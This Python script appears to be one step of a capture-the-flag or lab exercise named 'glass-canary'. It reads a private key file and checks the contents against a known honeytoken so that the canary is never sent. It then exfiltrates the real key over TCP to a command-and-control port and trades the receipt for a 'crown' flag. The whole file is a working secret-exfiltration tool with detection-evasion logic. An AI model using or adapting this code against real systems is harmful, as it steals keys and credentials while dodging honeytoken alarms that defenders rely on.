#!/usr/bin/env python3
"""Crown exfil: classify, exfil the real key (never the honeytoken), claim the crown.

Usage: 0006-crown-exfil.py --c2-port PORT --crown-port PORT \\
       --token DEPLOY_TOKEN --key PATH_TO_KEY [--host 127.0.0.1]
"""
import argparse
import json
import socket
import sys

HONEYTOKEN_CONTENT = "HONEYTOKEN-CC-DATA-4012-8831-0091"


def tcp_line(host: str, port: int, line: str, timeout: float = 10.0) -> str:
    """Send one line to a TCP service and return its reply."""
    with socket.create_connection((host, port), timeout=timeout) as sock:
        sock.sendall((line + "\n").encode())
        return sock.makefile("r").readline().strip()


def main(argv=None):
    parser = argparse.ArgumentParser(description="glass-canary crown exfil")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--c2-port", required=True, type=int)
    parser.add_argument("--crown-port", required=True, type=int)
    parser.add_argument("--token", required=True)
    parser.add_argument("--key", required=True)
    args = parser.parse_args(argv)
    try:
        with open(args.key, "r", encoding="utf-8") as fh:
            payload = fh.read()
    except OSError as exc:
        print(f"[exfil] cannot read key: {exc}", file=sys.stderr)
        return 1
    if HONEYTOKEN_CONTENT.strip() in payload:
        print("[exfil] refusing to exfil honeytoken data", file=sys.stderr)
        return 2
    envelope = json.dumps({"token": args.token, "payload": payload})
    try:
        reply = tcp_line(args.host, args.c2_port, "EXFIL " + envelope)
    except OSError as exc:
        print(f"[exfil] failed: {exc}", file=sys.stderr)
        return 3
    if not reply.startswith("receipt"):
        print(f"[exfil] rejected: {reply}", file=sys.stderr)
        return 4
    receipt = reply.split(" ", 1)[1]
    print(f"[exfil] receipt {receipt}")
    try:
        flag = tcp_line(args.host, args.crown_port, "CLAIM " + receipt)
    except OSError as exc:
        print(f"[exfil] crown claim failed: {exc}", file=sys.stderr)
        return 5
    if flag.startswith("ERROR"):
        print(f"[exfil] claim rejected: {flag}", file=sys.stderr)
        return 6
    print(f"[exfil] CROWN: {flag}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
